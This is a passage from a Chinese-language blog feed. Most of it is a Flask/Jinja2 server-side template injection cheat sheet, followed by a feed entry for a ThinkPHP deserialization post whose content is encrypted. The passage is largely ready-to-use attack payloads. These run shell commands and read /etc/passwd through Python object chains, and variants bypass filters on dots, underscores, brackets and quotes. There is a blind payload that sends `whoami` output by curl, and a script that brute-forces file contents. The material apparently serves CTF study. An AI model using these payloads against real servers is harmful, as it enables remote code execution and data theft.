class="line">__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-03-Python3-环境测试"><a href="#0x-03-Python3-环境测试" class="headerlink" title="0x 03 Python3 环境测试"></a>0x 03 Python3 环境测试</h3><p>类似于Python2的,常用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&quot;ls&quot;).read()</span><br><span class="line"># &lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br><span class="line"># &lt;class &#39;rlcompleter.Completer&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat</span><br><span class="line">&#x2F;flag&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>就是<code>__global__</code>中存在<code>sys</code>或者<code>system</code>或者<code>__builtins__</code>模块,fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;system&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;system&#39;,num,item)</span><br><span class="line">         if &#39;sys&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;sys&#39;,num,item)</span><br><span class="line">         if &#39;__builtins__&#39; in item.__init__.__globals__:</span><br><span class="line">          print(&#39;__builtins__&#39;,num,item)</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>Jinja2的for循环处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-04-ByPass"><a href="#0x-04-ByPass" class="headerlink" title="0x 04 ByPass"></a>0x 04 ByPass</h3><p><strong><code>.</code>被过滤</strong></p><p>基础payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>使用<code>getattr()</code>或者<code>|attr()</code>或者<code>[]</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__&#x3D;&gt;getattr([],&#39;__class__&#39;)</span><br><span class="line">[].__class__.__base__&#x3D;&gt;getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]&#x3D;&gt;getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__&#x3D;&gt;getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p><strong><code>_</code>被过滤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line"># &#39;__class__&#39;&#x3D;&#x3D;&gt;dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2</span><br></pre></td></tr></table></figure><p><strong>中括号被过滤</strong></p><p>可以用<code>getitem</code>或者<code>pop</code>进行绕过过滤</p><ul><li>读取文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.linecache.os.pop</span><br></pre></td></tr></table></figure><p><strong>引号被过滤</strong></p><ul><li>chr函数绕过过滤</li></ul><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>借助request对象</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><ul><li>过滤引号下的命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>过滤双括号</strong></p><ul><li>盲命令执行：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200407002155982.png" alt></p><ul><li>文件盲注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:5000?name&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload&#x3D;&quot;&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;lihuaiqiu&#39;).read()[&quot;+str(i)+&quot;:&quot;+str(i+1)+&quot;]&#x3D;&#x3D;&#39;&quot;+chr(j)+&quot;&#39; %&#125;~ok~&#123;% endif %&#125;&quot;</span><br><span class="line">        true_url&#x3D;url+payload</span><br><span class="line">        r&#x3D;requests.get(true_url)</span><br><span class="line">        if &#39;ok&#39; in r.text:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure><h3 id="0x-05-过滤trick"><a href="#0x-05-过滤trick" class="headerlink" title="0x 05 过滤trick"></a>0x 05 过滤trick</h3><p><strong>Python的一切皆对象思想</strong></p><p>过滤掉了<code>class和request</code>,通过<code>session</code>构造出<code>object</code>，payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure><p><strong><code>__enter__与__init__</code>的相似性</strong></p><p>通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p><ul><li>利用转义字符（16进制）过滤<code>.</code>和<code>_</code></li></ul><blockquote><p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>利用requests</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>其他</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure><h3 id="0x-06-最后总结"><a href="#0x-06-最后总结" class="headerlink" title="0x 06 最后总结"></a>0x 06 最后总结</h3><p><strong>Python 2.7</strong></p><p>jinja2的for循环一把梭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>Python 3.7</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>fuzz脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>jinja2判断</li></ul><p><code>49</code>:jinja2 返回的是 7777777 ，通过测试可以确定为 jinja2 </p><h3 id="0x-07-推荐工具"><a href="#0x-07-推荐工具" class="headerlink" title="0x 07 推荐工具"></a>0x 07 推荐工具</h3><p>一把梭： <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><blockquote><p>参考资料</p><p><a href="https://glotozz.github.io/2020/02/24/flask模版注入/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/24/flask模版注入/</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;参考这篇文章：&lt;a href=&quot;https://w
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="flask模板注入" scheme="http://yoursite.com/tags/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 6.0.x反序列化分析(一)</title>
    <link href="http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/</id>
    <published>2020-04-05T05:43:10.000Z</published>
    <updated>2020-04-05T12:26:19.581Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dcdfba4d3eb398d9fae1cea0f79d026a1d1fa33b3d4593f2ddfa60849bde109e">8931505bb83619d6ad17af3c681588a7c67e1c4a023a0d72ff734c3959c72ea248aabc8d84131af25235293a824d05b7d0e14964d9cabfae998a434d401f6c4f479129149ce56860955b704e1fe2ee377967b21a65cd482d9a5f50051f1eb15275e5af0bb645e7846a1c87e5d90b45eb8dd981999e3a769dba65d58c6cd1596b725a74a0b4a573122d75a0004c3c84ef1acfe26e8648eeb99ea13cc5ae0f9943aed6173a0261bda1d5567bdabcc6a4d9a5c5c12d7d52aedaf19c16157610445c2c791bfcad71f464e70a5b37f73d1b7a59e7815a103600daa36a2f28da28f66c218ef6a66d30c47100b06ed023edd1a58090cbbcf1d374a14c8d352687f7121926f5a06c586a34352e59f41af476cabff5f9b56a2e8d08f1fa906a3447032cea1880f569ab869f50ad20f1913ef17ac388c28f25fa09be2f0f337b97d80945ad77eb85c15dd5b8e55707424163964d4ac57271ce4551b9b23258542231d1e43181837a7ceebecff69c0ebe593500fe721eaa6743dc038b2a1b4a91fb8810482b6e103ba2522d415652397a24004762a2ce0ff5c1d1582b609564050a8689caf003e7f412ce657c1bfa766b2c113981572bee984cd08bbfb1806d16656a5be0d656d1390279871ea099228ba9a21ddaf61924a3a2fbe108bd4c1d61f7a9a9295d081cc021d461ee68ab42f5b79b02168e73ae16232da895533e3dc03c0a65bf122581cd3311544c8075d4ef7b5d38208998062a1b04da7c6ea617c1fabb2ad8d0aceb0ecd606af19c27026fafdc7b93229252f5b01661813065113b2fad91c26db9e8e452104683c56e5bf0e0e23d86479b4c286aa942996200e876ca93bcbe551bec95a0e98de26b7d340955250c5c5c52f4cc383e709e85c471e5965792a45593d72c15e7df1f4b97401ff57b94b96cd897df240be0db291aa4368a27bd75c9f7ce6e324ceaf36c2bbe07f5666a1384f629fa473898ef3216502bbdff25f6cc8df14fcd44097126a115df0747e0339e2b78e0930c569dea5268aedfa94cc729da16cc9bb40199b3f20f6f51c620d1be1c29106d6cf302ca9ac7229cc9726b1286d80c069b6cf7b939531a1f4a9d5dc005c25ab5e18c9e5cafff4a0db53c234aeb25922787a87a8fa6e4ec0284512f83b0d4b14dd130d366dc909596fd5d34c9d172269baf9cfe05cdcc12cf1f1fd13352f5910a2d18f6711b415bf46c22e315746b1337d32271bda7348102e396ac7195b2a9fb15951718c062e6167a8b33e99dade56763cf007974a2e892061189a79ae195859e60fc3fde6e2b5a320ebac426da354913cdefb9ef98cd7335ef2ca2931117fad58793d66a1e4cc0a0bc14c3cea5f51dbd523308872b425da817ad4e3db2e0197d81388d02afb7d346d1b2f8baa03525b63d574bdd24f7120bd7f3528f49ec8fa3341f1c947aded583ef89f5baeef905fd8f14906d2a7deda06435e15465bae33468f305ba9f2d90a0abd90eb2797cbfd31a80d7c16bf0027180a2cabab66712bb286b88e2210ccf405e82944f006361f50697775b07ddfd1b9d0cb9abc30eaddd216407f17b20df962dd5496b24cecbd6bd38b509e0e90f7a9244a7c70248bfcad675d9fb00d853ec3f18c684460678cb9cb3fd31ea142af075a00b5d608900e17a6462c3fc9817489bce7ac973b4bca5770bd10711c73459062d2506b3d7138b9197821ae2ee81a42d2db344df188840f16b0cb3490eaeb5606bc7907038e4eef0934da52ae48b069d0527b616fc248149256922a2566f51a76ae72d7274a29478c9cbd3d31fd832ec284c58c7ca2caeb189fb9c1bca91ac8a18d3645fbbc3825579561a733559d84bcaf8fbb939a69b09a98988afe0df91c86577eefb6eb86e5a8f718c76e1c8380bd30990774dfb75246cfc28fce12cb8b1cdf628f6e3fd4a69b632935d89ce6764cae817c33a554d111c8263cea4fc5be9c50293d728274f18246ab7c844ae20c5b01b5e9d84a04013a2e81e4cfc3df7e80910117b1b1a9b1094e4ff7192935bd0fa4a0090506dcc1f13644ea0bc141c2da426c9d7cd56522b417f670f28ee01e71205e4f43c8c361696080917409313a205718a25d3cde66cc754eefb7f09722304b87745258fa76358822311d6afd132018cb1343e30355fa9ecc7da46d9f96cddbd1c50faaa3af47c438c5abdc9e27c27ef2202cd8ad32f97fad927208715579de8260d12d31185dbd695b5e5826f63fe7b4879aa83c963bfa10b1cc32d808d1797c7539d8d17b5b133181788543c441661382e0aa83624001d224e4f09d428362a26a37f8c122ab16b46443c4a05aaeb882c6b04a5cfb4818cec28f2edff0305a5fc639a355dd05d3833f5209c26cd726d6da1680e58b3bd1129d10aab1c5a33297364771bf9117388143a057196cff5fd9e15c0c097dc73dfff2852fcfd5086f796387e606791aa9124829bc89edd207ce3680ff1c7d43c156ac30ebe2d997e75aec6511fbfbe1671c0ba9b8040bd572d7fbf07fe4911cce32b02b4b8488eeedcf8d398aa0d3d17ac210e359add0e6dffda02358f0a83341ac2ee961f598de616604e03e4f5a4c181c1ca88cb0749fc8da1cab130a95322718905c558e8e49a177fb037c6f3658d690e76e12cbf31baac8a39006450f967495a981cbd2e5e335f10b2bd41f06d3d0b98d82cd740d3d41edd6ea3edae835fef0a5255805993c63bd1f5531f8d5ffe1c5d0883e25ecbdc671ccc5df070d5c64357a120a3bce7180744d045e8036470f6b5a5ff1745a08018716e5456b27abe540a62a1a21e2b5bdcfb06a20778b1211ada5f88d139e520dba386051f4d7a1051119bb281bc7a8668ec4a1df139f8097c51943a07813fa8f0ebd7edaa8e7a10c63f029a0037630f4e40b6c7b1e6818f5cdba2d4747909aa8c57a69a907c2b0e9cad58bbe4c31937525425ea54efa25aa6bd5e289ac7007e8132a5fa901158e2dd5d39877961be6fb50604fe306d07769c9c5b384df8b3774eec274b88127b003047b6e4b63fc19594281450343503bbb2d551a56cc1785e42c345ba3